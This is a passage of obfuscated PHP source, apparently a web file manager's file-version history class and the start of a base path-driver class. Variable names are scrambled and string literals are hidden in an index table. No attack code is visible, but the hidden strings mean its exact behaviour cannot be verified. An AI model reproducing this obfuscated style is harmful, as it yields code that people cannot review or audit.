self::listData($Ä¢ÛÅ¸å); $øşä„¦ = rtrim($‚¸Öáúú, $êÂ£²÷ñ[8]) . $êÂ£²÷ñ[8] . ($ˆĞƒ‡ÔĞ ? $ˆĞƒ‡ÔĞ : get_path_this($Ä¢ÛÅ¸å)); $ğçèò«ƒ = self::listData($øşä„¦); if ($Òóıó¯ø && $Òóıó¯ø[$êÂ£²÷ñ[447]] && $ğçèò«ƒ && $ğçèò«ƒ[$êÂ£²÷ñ[447]]) { return self::clear($Ä¢ÛÅ¸å); } if ($Òóıó¯ø && $Òóıó¯ø[$êÂ£²÷ñ[447]]) { self::moveHistory($Ä¢ÛÅ¸å, $ˆĞƒ‡ÔĞ, $ÏŠ˜ì“ø); } } else { IO::move($âçŒœìØ[$êÂ£²÷ñ[87]], $ÏŠ˜ì“ø, !1, $ˆĞƒ‡ÔĞ); self::clearEmptyFolder(IO::pathFather($âçŒœìØ[$êÂ£²÷ñ[87]])); } } public static function eventAfterRemove($’¿ùÙÔ, $É³¼“Éä) { $¡‰Š„Œğ =& $_SERVER[†ûãı«°]; if (!$É³¼“Éä) { return; } $µ†ß°¡ = self::parsePath($’¿ùÙÔ[0]); if (!$µ†ß°¡) { return; } $úï»Å¥ş = self::checkInHistory($µ†ß°¡); if (!$úï»Å¥ş) { return; } if ($úï»Å¥ş[$¡‰Š„Œğ[33]] == $¡‰Š„Œğ[232]) { $Œ©üûİ = self::listData($µ†ß°¡, !1); if ($Œ©üûİ && $Œ©üûİ[$¡‰Š„Œğ[447]]) { self::clear($µ†ß°¡, !1); } } else { IO::remove($úï»Å¥ş[$¡‰Š„Œğ[87]]); self::clearEmptyFolder(IO::pathFather($úï»Å¥ş[$¡‰Š„Œğ[87]])); } } private static function checkInHistory($±ü©œ÷ê) { $­è³‡“ = self::pathHistory($±ü©œ÷ê); if (!IO::exist($­è³‡“)) { $­è³‡“ .= $_SERVER[†ûãı«°][1327]; } return IO::exist($­è³‡“) ? IO::info($­è³‡“) : !1; } private static function parsePath($ä Ó˜øŒ) { $êèğåú =& $_SERVER[†ûãı«°]; if (!$ä Ó˜øŒ) { return !1; } if (isset($GLOBALS[$êèğåú[1328]]) && $GLOBALS[$êèğåú[1328]]) { return; } $»Ş¤‰ß‰ = KodIO::parse($ä Ó˜øŒ); $Çóö©Ëæ = $»Ş¤‰ß‰[$êèğåú[33]]; $ÀÜ°ÌæŸ = !$Çóö©Ëæ || $Çóö©Ëæ == KodIO::KOD_IO || $Çóö©Ëæ == KodIO::KOD_SHARE_ITEM; if (!$ÀÜ°ÌæŸ || !$»Ş¤‰ß‰[$êèğåú[1329]]) { return !1; } if (substr($ä Ó˜øŒ, 0, strlen(DATA_PATH . $êèğåú[1330])) == DATA_PATH . $êèğåú[1330]) { return !1; } if ($Çóö©Ëæ == KodIO::KOD_SHARE_ITEM) { $Õ‘ÑÄ² = IO::init($ä Ó˜øŒ); if ($Õ‘ÑÄ²->pathParse[$êèğåú[1243]]) { return self::parsePath($Õ‘ÑÄ²->pathParse[$êèğåú[1243]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Â®»Áßı = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $êèğåú[1331]); foreach ($Â®»Áßı as $•¡ª¯ç´) { if (!$Çóö©Ëæ && substr($ä Ó˜øŒ, 0, strlen($•¡ª¯ç´)) == $•¡ª¯ç´) { return !1; } } self::log($GLOBALS[$êèğåú[1238]] . $êèğåú[1332] . $ä Ó˜øŒ); return $ä Ó˜øŒ; } private static function pathHistory($Ğòá€ª«) { $í’ôÂÇ =& $_SERVER[†ûãı«°]; $ÁÔóòï¥ = self::$_historyBase . ltrim(KodIO::clear($Ğòá€ª«), $í’ôÂÇ[8]); $ÁÔóòï¥ = str_replace(array($í’ôÂÇ[1333]), array($í’ôÂÇ[1334]), $ÁÔóòï¥); return $ÁÔóòï¥; } public static function log($ü”¨Ù–) { } public static function historyCount($Ñø‰Íİù) { $²¼´¬îÀ =& $_SERVER[†ûãı«°]; $à£ØÕİ = array(); $êÈ®À÷à = array(); foreach ($Ñø‰Íİù as $„ÀàûÔø) { $ìß”¹ = get_path_father($„ÀàûÔø); if (!$êÈ®À÷à[$ìß”¹]) { $êÈ®À÷à[$ìß”¹] = array(); } $êÈ®À÷à[$ìß”¹][] = get_path_this($„ÀàûÔø); } foreach ($êÈ®À÷à as $ìß”¹ => $õ’îÀƒ) { $Å¸»­§ò = self::parsePath($ìß”¹); if (!$Å¸»­§ò) { continue; } foreach ($õ’îÀƒ as $•†Æı‚ı) { $Âåµ¨Àñ = self::listData(rtrim($Å¸»­§ò, $²¼´¬îÀ[8]) . $²¼´¬îÀ[8] . $•†Æı‚ı, !1); if ($Âåµ¨Àñ && $Âåµ¨Àñ[$²¼´¬îÀ[447]]) { $à£ØÕİ[rtrim($ìß”¹, $²¼´¬îÀ[8]) . $²¼´¬îÀ[8] . $•†Æı‚ı] = count($Âåµ¨Àñ[$²¼´¬îÀ[447]]); } } } return $à£ØÕİ; } public static function add($³á­¤€‚) { $Åá¾‰ ¢ =& $_SERVER[†ûãı«°]; $¢èúÈïõ = self::listData($³á­¤€‚); if (!$¢èúÈïõ) { return; } $˜´×Ô®– = Model($Åá¾‰ ¢[846])->get($Åá¾‰ ¢[1335]); $½µäï• = intval($GLOBALS[$Åá¾‰ ¢[6]][$Åá¾‰ ¢[92]][$Åá¾‰ ¢[1313]]); $™ƒéØÒ­ = $˜´×Ô®– == $Åá¾‰ ¢[1336] ? min(5, $½µäï•) : $½µäï•; if ($½µäï• <= 0) { return; } $©†äÄä = IO::info($³á­¤€‚); $€Æ‰ëÂ“ = $¢èúÈïõ[$Åá¾‰ ¢[447]]; if ($©†äÄä[$Åá¾‰ ¢[79]] == 0) { return; } if ($©†äÄä[$Åá¾‰ ¢[79]] >= 1024 * 1024 * 500) { return !1; } $€Í”ŠÁÕ = IO::hashSimple($³á­¤€‚); if ($€Æ‰ëÂ“ && $€Æ‰ëÂ“[0][$Åá¾‰ ¢[679]] == $€Í”ŠÁÕ) { return !0; } if (array_key_exists($Åá¾‰ ¢[235], $©†äÄä) && !$©†äÄä[$Åá¾‰ ¢[235]]) { return !1; } $€ÖœõÅÁ = short_id(time()); $úÀ±™åĞ = array($Åá¾‰ ¢[477] => $€ÖœõÅÁ, $Åá¾‰ ¢[679] => $€Í”ŠÁÕ, $Åá¾‰ ¢[32] => $©†äÄä[$Åá¾‰ ¢[32]] . $Åá¾‰ ¢[10] . date($Åá¾‰ ¢[1337]) . rand_string(1), $Åá¾‰ ¢[79] => $©†äÄä[$Åá¾‰ ¢[79]], $Åá¾‰ ¢[529] => USER_ID, $Åá¾‰ ¢[233] => time(), $Åá¾‰ ¢[1338] => $Åá¾‰ ¢[12]); IO::mkdir($¢èúÈïõ[$Åá¾‰ ¢[1339]]); $¤´É ‘İ = IO::copy($³á­¤€‚, $¢èúÈïõ[$Åá¾‰ ¢[1339]], !1, $úÀ±™åĞ[$Åá¾‰ ¢[32]]); if (!$¤´É ‘İ) { self::clearEmptyFolder($¢èúÈïõ[$Åá¾‰ ¢[1339]]); return !1; } array_unshift($€Æ‰ëÂ“, $úÀ±™åĞ); if (count($€Æ‰ëÂ“) > $™ƒéØÒ­) { $‚ƒÆ»°á = array_slice($€Æ‰ëÂ“, $™ƒéØÒ­); foreach ($‚ƒÆ»°á as $¾•ß»é) { IO::remove($¢èúÈïõ[$Åá¾‰ ¢[1339]] . $¾•ß»é[$Åá¾‰ ¢[32]]); } $€Æ‰ëÂ“ = array_slice($€Æ‰ëÂ“, 0, $™ƒéØÒ­); } return self::saveData($¢èúÈïõ[$Åá¾‰ ¢[1340]], $€Æ‰ëÂ“); } public static function remove($åÇà¨€Ë, $â¢®³—Š) { $²…ç²Á€ =& $_SERVER[†ûãı«°]; $¨™ù²ä = self::listData($åÇà¨€Ë); $¸üŠó¡Œ = array(); if (!$¨™ù²ä) { return !1; } foreach ($¨™ù²ä[$²…ç²Á€[447]] as $Ÿ ôû„ô) { if ($Ÿ ôû„ô[$²…ç²Á€[477]] == $â¢®³—Š) { IO::remove($¨™ù²ä[$²…ç²Á€[1339]] . $Ÿ ôû„ô[$²…ç²Á€[32]]); continue; } $¸üŠó¡Œ[] = $Ÿ ôû„ô; } return self::saveData($¨™ù²ä[$²…ç²Á€[1340]], $¸üŠó¡Œ); } public static function clear($’º‹™øÚ, $Èª›°ùÔ = true) { $Ş·¿¥Öù =& $_SERVER[†ûãı«°]; $· ÀÆ¡¾ = self::listData($’º‹™øÚ, $Èª›°ùÔ); if (!$· ÀÆ¡¾) { return !1; } foreach ($· ÀÆ¡¾[$Ş·¿¥Öù[447]] as $àøöÚ“) { IO::remove($· ÀÆ¡¾[$Ş·¿¥Öù[1339]] . $àøöÚ“[$Ş·¿¥Öù[32]]); } return self::saveData($· ÀÆ¡¾[$Ş·¿¥Öù[1340]], array()); } public static function moveHistory($“Å«‹¹Â, $Š›ÖÌå± = '', $¡ºâÁó¨ = '') { $§í¿ó­‡ =& $_SERVER[†ûãı«°]; $€ñ¥†õ = self::listData($“Å«‹¹Â, !1); if (!$€ñ¥†õ || !$€ñ¥†õ[$§í¿ó­‡[447]]) { return !1; } $¿‰ßé»­ = $§í¿ó­‡[1327]; $Š›ÖÌå± = $Š›ÖÌå± ? $Š›ÖÌå± : get_path_this($“Å«‹¹Â); $¡ºâÁó¨ = $¡ºâÁó¨ ? $¡ºâÁó¨ : $€ñ¥†õ[$§í¿ó­‡[1339]]; $ÚŒ‘øøî = substr(get_path_this($€ñ¥†õ[$§í¿ó­‡[1340]]), 0, -strlen($¿‰ßé»­)); foreach ($€ñ¥†õ[$§í¿ó­‡[447]] as $”ï´­¶ˆ => $›±Öè ) { $¼§Õ ªß = $Š›ÖÌå± . substr($›±Öè [$§í¿ó­‡[32]], strlen($ÚŒ‘øøî)); $•´½—ì‚ = IO::move($€ñ¥†õ[$§í¿ó­‡[1339]] . $›±Öè [$§í¿ó­‡[32]], $¡ºâÁó¨, !1, $¼§Õ ªß); if ($•´½—ì‚) { $€ñ¥†õ[$§í¿ó­‡[447]][$”ï´­¶ˆ][$§í¿ó­‡[32]] = $¼§Õ ªß; } } $€ñ¥†õ[$§í¿ó­‡[1340]] = IO::move($€ñ¥†õ[$§í¿ó­‡[1340]], $¡ºâÁó¨, !1, $Š›ÖÌå± . $¿‰ßé»­); self::saveData($€ñ¥†õ[$§í¿ó­‡[1340]], $€ñ¥†õ[$§í¿ó­‡[447]]); self::clearEmptyFolder($€ñ¥†õ[$§í¿ó­‡[1339]]); } public static function rollback($ÀÔÏ…Ø, $üßÏÚ¥) { $©¦î×øå =& $_SERVER[†ûãı«°]; $™±²ÁÙİ = self::listData($ÀÔÏ…Ø); if (!$™±²ÁÙİ) { return; } $¢ŒâÙè² = IO::info($ÀÔÏ…Ø); foreach ($™±²ÁÙİ[$©¦î×øå[447]] as $ÈùÏåÔï => $Á²ğ×÷÷) { if ($Á²ğ×÷÷[$©¦î×øå[477]] == $üßÏÚ¥) { self::add($ÀÔÏ…Ø); $¦ß»Ë´ú = $™±²ÁÙİ[$©¦î×øå[1339]] . $Á²ğ×÷÷[$©¦î×øå[32]]; $İàÃıÈõ = IO::copy($¦ß»Ë´ú, IO::pathFather($ÀÔÏ…Ø), REPEAT_REPLACE, $¢ŒâÙè²[$©¦î×øå[32]]); if ($İàÃıÈõ) { self::remove($ÀÔÏ…Ø, $üßÏÚ¥); } return $İàÃıÈõ; } } return !1; } public static function setDetail($õŸÂÓ¸, $åÜ–Ì¶, $ç¾éàÜ“) { $Ÿûï“Â =& $_SERVER[†ûãı«°]; $¬‡¿¾²› = self::listData($õŸÂÓ¸); if (!$¬‡¿¾²›) { return; } foreach ($¬‡¿¾²›[$Ÿûï“Â[447]] as $“ÜéĞÊ» => $÷îëÈ) { if ($÷îëÈ[$Ÿûï“Â[477]] == $åÜ–Ì¶) { $¬‡¿¾²›[$Ÿûï“Â[447]][$“ÜéĞÊ»][$Ÿûï“Â[1338]] = $ç¾éàÜ“; self::saveData($¬‡¿¾²›[$Ÿûï“Â[1340]], $¬‡¿¾²›[$Ÿûï“Â[447]]); return !0; } } return !1; } public static function fileInfo($œÄë×­, $‚ù¯±òÑ) { $Ø§ÓÂšÙ =& $_SERVER[†ûãı«°]; $ù¤¥À¦Ê = self::listData($œÄë×­); if (!$ù¤¥À¦Ê) { show_json(LNG($Ø§ÓÂšÙ[108]), !1); } $®Í³Ìı° = $Ø§ÓÂšÙ[12]; foreach ($ù¤¥À¦Ê[$Ø§ÓÂšÙ[447]] as $ÏáÏš“ => $ç”Ù¥¤¯) { if ($ç”Ù¥¤¯[$Ø§ÓÂšÙ[477]] != $‚ù¯±òÑ) { continue; } $®Í³Ìı° = $ù¤¥À¦Ê[$Ø§ÓÂšÙ[1339]] . $ç”Ù¥¤¯[$Ø§ÓÂšÙ[32]]; break; } if (!$®Í³Ìı°) { show_json(LNG($Ø§ÓÂšÙ[108]), !1); } return IO::info($®Í³Ìı°); } public static function fileOut($§Õ…¹ûÃ, $ú½ãÓÇ, $¿¾–É‚ò = false) { $ ²Á—¤ =& $_SERVER[†ûãı«°]; $°‹“–ÒÉ = self::fileInfo($§Õ…¹ûÃ, $ú½ãÓÇ); $™¸•µš¸ =& $GLOBALS[$ ²Á—¤[7]]; $¿¾–É‚ò = isset($™¸•µš¸[$ ²Á—¤[1290]]) && $™¸•µš¸[$ ²Á—¤[1290]] == 1; if (isset($™¸•µš¸[$ ²Á—¤[33]]) && $™¸•µš¸[$ ²Á—¤[33]] == $ ²Á—¤[1341]) { return IO::fileOutImage($°‹“–ÒÉ[$ ²Á—¤[87]], $™¸•µš¸[$ ²Á—¤[1342]]); } IO::fileOut($°‹“–ÒÉ[$ ²Á—¤[87]], $¿¾–É‚ò, get_path_this($§Õ…¹ûÃ)); } public static function listData($ÄÒÊ°±€, $íû½Å‡¸ = true) { $·ˆôÑÒ =& $_SERVER[†ûãı«°]; if ($íû½Å‡¸ && !IO::exist($ÄÒÊ°±€)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ÄÒÊ°±€, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $„»’ş = self::pathHistory($ÄÒÊ°±€); $ÓœºÖè÷ = array($·ˆôÑÒ[1340] => $„»’ş . $·ˆôÑÒ[1327], $·ˆôÑÒ[1339] => rtrim(get_path_father($„»’ş), $·ˆôÑÒ[8]) . $·ˆôÑÒ[8], $·ˆôÑÒ[447] => array()); $ø††¤â = IO::getContent($ÓœºÖè÷[$·ˆôÑÒ[1340]]); if ($ø††¤â) { $¥üï½ÂÁ = json_decode($ø††¤â, !0); if (is_array($¥üï½ÂÁ)) { $ÓœºÖè÷[$·ˆôÑÒ[447]] = $¥üï½ÂÁ; } } return $ÓœºÖè÷; } private static function saveData($‡­ˆ”˜¨, $ö¼èİš‚) { $±ŞòÈ¸Ò =& $_SERVER[†ûãı«°]; self::log($±ŞòÈ¸Ò[1343] . $‡­ˆ”˜¨ . $±ŞòÈ¸Ò[74] . count($ö¼èİš‚), $±ŞòÈ¸Ò[828]); if ($ö¼èİš‚) { return IO::setContent($‡­ˆ”˜¨, json_encode($ö¼èİš‚)); } $×úäÁ„Ò = IO::pathFather($‡­ˆ”˜¨); IO::remove($‡­ˆ”˜¨); self::clearEmptyFolder($×úäÁ„Ò); return !0; } public static function clearEmptyFolder($ğ¥ƒò•) { $«Â¿˜¢³ =& $_SERVER[†ûãı«°]; if (trim($ğ¥ƒò•, $«Â¿˜¢³[8]) == trim(self::$_historyBase, $«Â¿˜¢³[8])) { return; } $í‰ä­Ùœ = IO::pathFather($ğ¥ƒò•); $²ÁŒ•Ï€ = IO::has($ğ¥ƒò•, !0); if ($²ÁŒ•Ï€[$«Â¿˜¢³[241]] > 0 || $²ÁŒ•Ï€[$«Â¿˜¢³[242]] > 0) { return; } IO::remove($ğ¥ƒò•); self::clearEmptyFolder($í‰ä­Ùœ); } private static function getBasePath() { $Î’‹Å£¼ =& $_SERVER[†ûãı«°]; $€ñĞ´ş´ = Model($Î’‹Å£¼[1344])->get($Î’‹Å£¼[1345]); if ($€ñĞ´ş´) { if (!IO::exist($€ñĞ´ş´)) { IO::mkdir($€ñĞ´ş´); } if (get_path_this($€ñĞ´ş´) == $Î’‹Å£¼[1330]) { $ö‚ŞÕÂ = $Î’‹Å£¼[1346] . rand_string(8); @rename($€ñĞ´ş´, get_path_father($€ñĞ´ş´) . $Î’‹Å£¼[8] . $ö‚ŞÕÂ); $€ñĞ´ş´ = DATA_PATH . $ö‚ŞÕÂ . $Î’‹Å£¼[8]; file_put_contents(DATA_PATH . $Î’‹Å£¼[1277], $Î’‹Å£¼[12]); Model($Î’‹Å£¼[1344])->set($Î’‹Å£¼[1345], $€ñĞ´ş´); } return $€ñĞ´ş´; } $€ñĞ´ş´ = DATA_PATH . $Î’‹Å£¼[1346] . rand_string(8) . $Î’‹Å£¼[8]; $€ñĞ´ş´ = IO::mkdir($€ñĞ´ş´); $€ñĞ´ş´ = rtrim($€ñĞ´ş´, $Î’‹Å£¼[8]) . $Î’‹Å£¼[8]; file_put_contents($€ñĞ´ş´ . $Î’‹Å£¼[1277], $Î’‹Å£¼[12]); file_put_contents(DATA_PATH . $Î’‹Å£¼[1277], $Î’‹Å£¼[12]); Model($Î’‹Å£¼[1344])->set($Î’‹Å£¼[1345], $€ñĞ´ş´); return $€ñĞ´ş´; } } goto fË˜æÀ«ÍÕ; E—ŒÍ¥¦¦Ñ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $«ş©ûë‹ =& $_SERVER[†ûãı«°]; $this->objectDriver = array($«ş©ûë‹[60], $«ş©ûë‹[61], $«ş©ûë‹[62], $«ş©ûë‹[63], $«ş©ûë‹[64], $«ş©ûë‹[65], $«ş©ûë‹[66], $«ş©ûë‹[67], $«ş©ûë‹[68], $«ş©ûë‹[69], $«ş©ûë‹[70], $«ş©ûë‹[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($»ÌÆ¾ôß) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($»ÌÆ¾ôß, $_SERVER[†ûãı«°][8]); } return $»ÌÆ¾ôß; } public function iconvApp($»µ…£Ğš) { return $»µ…£Ğš; } public function iconvSystem($„”©Ş”) { return $„”©Ş”; } public function iconvTo($Ü§€´úü, $¨²ôœ©Ÿ, $÷›“ğ¥¶) { $à±Öä†œ =& $_SERVER[†ûãı«°]; if (!$Ü§€´úü || !function_exists($à±Öä†œ[72])) { return $Ü§€´úü; } static $ÒÃš‘ô¼ = array(); $Áõµº› = $¨²ôœ©Ÿ . $à±Öä†œ[73] . $÷›“ğ¥¶ . $à±Öä†œ[74] . $Ü§€´úü; if (isset($ÒÃš‘ô¼[$Áõµº›])) { return $ÒÃš‘ô¼[$Áõµº›]; } if (function_exists($à±Öä†œ[75])) { $ŠöÚ úş = @mb_convert_encoding($Ü§€´úü, $÷›“ğ¥¶, $¨²ôœ©Ÿ); } else { $ŠöÚ úş = @iconv($¨²ôœ©Ÿ, $÷›“ğ¥¶, $Ü§€´úü); } $ŠöÚ úş = $ŠöÚ úş ? $ŠöÚ úş : $Ü§€´úü; if (strstr($ŠöÚ úş, $à±Öä†œ[76])) { $ŠöÚ úş = str_replace($à±Öä†œ[76], $à±Öä†œ[11], $ŠöÚ úş); } $ÒÃš‘ô¼[$¨²ôœ©Ÿ . $à±Öä†œ[73] . $÷›“ğ¥¶ . $à±Öä†œ[74] . $Ü§€´úü] = $ŠöÚ úş; $ÒÃš‘ô¼[$÷›“ğ¥¶ . $à±Öä†œ[73] . $¨²ôœ©Ÿ . $à±Öä†œ[74] . $Ü§€´úü] = $Ü§€´úü; $ÒÃš‘ô¼[$÷›“ğ¥¶ . $à±Öä†œ[73] . $¨²ôœ©Ÿ . $à±Öä†œ[74] . $ŠöÚ úş] = $Ü§€´úü; $ÒÃš‘ô¼[$¨²ôœ©Ÿ . $à±Öä†œ[73] . $÷›“ğ¥¶ . $à±Öä†œ[74] . $ŠöÚ úş] = $ŠöÚ úş; return $ŠöÚ úş; } public function getPathInner($û­€™âÌ) { $ş½áâÜÊ = IO::init($û­€™âÌ); return $ş½áâÜÊ->path; } public function getPathOuter($€Šºê£ø) { $Ô÷ŞÜêü =& $_SERVER[†ûãı«°]; $ÅÍ·Ú” = strlen(trim($this->pathBase, $Ô÷ŞÜêü[8])); $€Šºê£ø = substr(trim($€Šºê£ø, $Ô÷ŞÜêü[8]), $ÅÍ·Ú”); return $this->pathDriver . $Ô÷ŞÜêü[8] . ltrim($€Šºê£ø, $Ô÷ŞÜêü[8]); } public function isParentOf($Æ‚Âèô, $Ü‘¤‚Òƒ) { $»„ä·Ã‹ =& $_SERVER[†ûãı«°]; $Æ‚Âèô = rtrim(strtolower($Æ‚Âèô), $»„ä·Ã‹[8]) . $»„ä·Ã‹[8]; $Ü‘¤‚Òƒ = rtrim(strtolower($Ü‘¤‚Òƒ), $»„ä·Ã‹[8]) . $»„ä·Ã‹[8]; $ç¤«¯† = strpos($Ü‘¤‚Òƒ, $Æ‚Âèô) === 0; return $ç¤«¯†; } public function getType() { $«ˆ‘½å¸ =& $_SERVER[†ûãı«°]; $¹Œ¨ò±Å = str_replace($«ˆ‘½å¸[77], $«ˆ‘½å¸[12], get_class($this)); return strtolower($¹Œ¨ò±Å); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($¸÷Ÿ˜šˆ, $Ê¤÷âº½) { $Ô¡Ÿ‹„Û =& $_SERVER[†ûãı«°]; $‘Ä¾³µÓ = rtrim($¸÷Ÿ˜šˆ, $Ô¡Ÿ‹„Û[8]) . $Ô¡Ÿ‹„Û[8] . $Ê¤÷âº½; $…ˆäÛ±ß = $this->exist($‘Ä¾³µÓ); return $…ˆäÛ±ß ? $‘Ä¾³µÓ : !1; } public function setModifyTime($”ıµ‚ø‚, $Ó˜å†¿¬ = '') { } public function renameObject($ÜÈó×É¦, $óôô€Ø¾) { $Ã‰„ıß = $óôô€Ø¾; $ÜÈó×É¦ = $this->getPathOuter($ÜÈó×É¦); $óôô€Ø¾ = $this->pathFather($ÜÈó×É¦) . $óôô€Ø¾; $‹¸í»šø = IO::copy($ÜÈó×É¦, $this->pathFather($ÜÈó×É¦), REPEAT_RENAME_FOLDER, $Ã‰„ıß); if ($‹¸í»šø) { IO::remove($ÜÈó×É¦); } return $‹¸í»šø ? $óôô€Ø¾ : !1; } public function tempFile($¡ßø¨Î = '', $Ú™ì¨‚ = '') { if (!$¡ßø¨Î) { $¡ßø¨Î = rand_string(15); } $‚û©ï´Ó = TEMP_FILES . rand_string(15) . $_SERVER[†ûãı«°][8]; @mkdir($‚û©ï´Ó, DEFAULT_PERRMISSIONS, !0); $ã–Ï–ÍÈ = $‚û©ï´Ó . $¡ßø¨Î; @touch($ã–Ï–ÍÈ); if ($Ú™ì¨‚) { file_put_contents($ã–Ï–ÍÈ, $Ú™ì¨‚); } return $ã–Ï–ÍÈ; } public function tempFileRemve($Š¦×åÛå) { @unlink($Š¦×åÛå); @rmdir($this->pathFather($Š¦×åÛå)); } public function mkfile($Åö†êé, $óøî œ = '', $ğ¿±¢œ‡ = REPEAT_RENAME) { } public function mkdir($ëŠ•­Ùô, $Èéæ«ôš = REPEAT_SKIP) { } public function delFile($º—Ò¢õ) { } public function delFolder($Ñ‘öñÄŸ) { } public function copyFile($°†ÒÅ», $’Í ©Ş¤) { } public function moveFile($ºœÒå¦ú, $ÕŒà‡„ü) { } public function remove($Ğ¾òÃ¦) { if ($this->isFile($Ğ¾òÃ¦)) { return $this->delFile($Ğ¾òÃ¦); } return $this->delFolder($Ğ¾òÃ¦); } public function rename($ıŞ»õÈ§, $ªê¬âÜ) { } public function exist($•üïæ…) { } public function findByHash($—şŒñ‡Ë = '', $ßöàÂ…È = '') { return !1; } public function isFile($¨„‘ªÔğ) { } public function isFolder($ß¥ú©µº) { } public function size($¥Á±ä—£) { } public function info($ò§š¡¦) { } public function infoSimple($ö›ú•÷¨) { return $this->info($ö›ú•÷¨); } public function infoAuth($Ú¤·¯üæ) { return $this->info($Ú¤·¯üæ); } public function infoFull($¸©Ï¨ÖÏ) { return $this->info($¸©Ï¨ÖÏ); } public function infoFullSimple($Ûéé£ú) { return $this->info($Ûéé£ú); } public function infoWithChildren($ŠıÜŞÎ) { $İ©›ÖĞ =& $_SERVER[†ûãı«°]; static $ÂˆêÅ³ï = array(); if (isset($ÂˆêÅ³ï[$ŠıÜŞÎ])) { return $ÂˆêÅ³ï[$ŠıÜŞÎ]; } $•í£ÈÖ× = $this->info($ŠıÜŞÎ); if ($•í£ÈÖ× && $•í£ÈÖ×[$İ©›ÖĞ[33]] == $İ©›ÖĞ[78]) { $ÊÎšó€ = array($İ©›ÖĞ[79] => 0, $İ©›ÖĞ[80] => 0, $İ©›ÖĞ[81] => 0); $this->infoChildren($ŠıÜŞÎ, $ÊÎšó€); $•í£ÈÖ×[$İ©›ÖĞ[79]] = $ÊÎšó€[$İ©›ÖĞ[79]]; $•í£ÈÖ×[$İ©›ÖĞ[82]] = array($İ©›ÖĞ[83] => $ÊÎšó€[$İ©›ÖĞ[80]], $İ©›ÖĞ[84] => $ÊÎšó€[$İ©›ÖĞ[81]]); $ÂˆêÅ³ï[$ŠıÜŞÎ] = $•í£ÈÖ×; } return $•í£ÈÖ×; } public function listPath($Ùöæ„¡ê, $•Õ¬ã = false) { } public function has($„õËùé, $ÖØ¥ªµ = false, $›ç‹£¨ø = false) { } public function canRead($¾¨òº‰) { } public function canWrite($íµÓ›±”) { } public function getContent($èÊ²·ã™) { } public function setContent($‹ê±äË´, $×Ü©¥¡Ç = '') { } protected function infoChildren($Ûæ¼ü÷ì, &$›ÜÕôüñ) { $†¾¸š“” =& $_SERVER[†ûãı«°]; check_abort_echo(); $Ú«È°¨À = $this->listPath($Ûæ¼ü÷ì, !0); $Ú«È°¨À = array_merge($Ú«È°¨À[$†¾¸š“”[85]], $Ú«È°¨À[$†¾¸š“”[86]]); foreach ($Ú«È°¨À as $¹§ö¦Ù) { if ($¹§ö¦Ù[$†¾¸š“”[33]] == $†¾¸š“”[78]) { $›ÜÕôüñ[$†¾¸š“”[81]]++; $ö¾Œ¼îÑ = $this->getPathInner($¹§ö¦Ù[$†¾¸š“”[87]]); $this->infoChildren($ö¾Œ¼îÑ, $›ÜÕôüñ); } else { $›ÜÕôüñ[$†¾¸š“”[80]]++; $›ÜÕôüñ[$†¾¸š“”[79]] += $¹§ö¦Ù[$†¾¸š“”[79]]; } } } public function fileSubstr($Ğğ”Ô, $ÍÂåÌ¬ê, $© ‡¶œÍ) { } public function listAll($†‰¯å®º) { } public function listAllMake($ÀÙşóÆ, &$÷ìçã‡ı) { $›‡€¨˜í =& $_SERVER[†ûãı«°]; check_abort_echo(); $‚ª¨› Ã = $this->listPath($ÀÙşóÆ, !0); if (!$‚ª¨› Ã) { return; } $ÖØâü…÷ = array_merge($‚ª¨› Ã[$›‡€¨˜í[85]], $‚ª¨› Ã[$›‡€¨˜í[86]]); foreach ($ÖØâü…÷ as $¿ÂãÇÅ°) { $›÷Çãì„ = $¿ÂãÇÅ°[$›‡€¨˜í[33]] == $›‡€¨˜í[78]; $‚˜ÚÜô˜ = array($›‡€¨˜í[87] => $¿ÂãÇÅ°[$›‡€¨˜í[87]], $›‡€¨˜í[78] => $›÷Çãì„); if (isset($¿ÂãÇÅ°[$›‡€¨˜í[79]])) { $‚˜ÚÜô˜[$›‡€¨˜í[79]] = $¿ÂãÇÅ°[$›‡€¨˜í[79]]; } if (isset($¿ÂãÇÅ°[$›‡€¨˜í[88]])) { $‚˜ÚÜô˜[$›‡€¨˜í[88]] = $¿ÂãÇÅ°[$›‡€¨˜í[88]]; } if (!$›÷Çãì„) { $÷ìçã‡ı[] = $‚˜ÚÜô˜; continue; } $÷ìçã‡ı[] = $‚˜ÚÜô˜; $¿ìÒÑÊ = $¿ÂãÇÅ°[$›‡€¨˜í[87]]; $ê¦·ã–¬ = $this->pathDriver; if (substr($¿ÂãÇÅ°[$›‡€¨˜í[87]], 0, strlen($ê¦·ã–¬)) == $ê¦·ã–¬) { $¿ìÒÑÊ = substr($¿ìÒÑÊ, strlen($ê¦·ã–¬)); } $this->listAllMake($¿ìÒÑÊ, $÷ìçã‡ı); } } public function listAllSimple($–ƒÆıæÇ, $ÃèãÒâÔ = false) { $êúÉ‰€ = $this->listAll($–ƒÆıæÇ); return $this->listAllSimpleMake($êúÉ‰€, $this->getPathOuter($–ƒÆıæÇ), $ÃèãÒâÔ); } public function listAllSimpleMake($È¦ñ, $Ä¨¸Å–‚, $™ÆšóÂ¶) { $´ô øÓâ =& $_SERVER[†ûãı«°]; $€ñ”®ÁÅ = array(); $Ä¨¸Å–‚ = rtrim(get_path_father($Ä¨¸Å–‚), $´ô øÓâ[8]) . $´ô øÓâ[8]; foreach ($È¦ñ as $°ãÚÖ°) { $ñ„€ŒÆ = array($´ô øÓâ[87] => $°ãÚÖ°[$´ô øÓâ[87]], $´ô øÓâ[89] => $°ãÚÖ°[$´ô øÓâ[87]], $´ô øÓâ[78] => $°ãÚÖ°[$´ô øÓâ[78]]); if (isset($°ãÚÖ°[$´ô øÓâ[79]]) && !$°ãÚÖ°[$´ô øÓâ[78]]) { $ñ„€ŒÆ[$´ô øÓâ[79]] = $°ãÚÖ°[$´ô øÓâ[79]]; } if (isset($°ãÚÖ°[$´ô øÓâ[88]])) { $ñ„€ŒÆ[$´ô øÓâ[88]] = $°ãÚÖ°[$´ô øÓâ[88]]; } 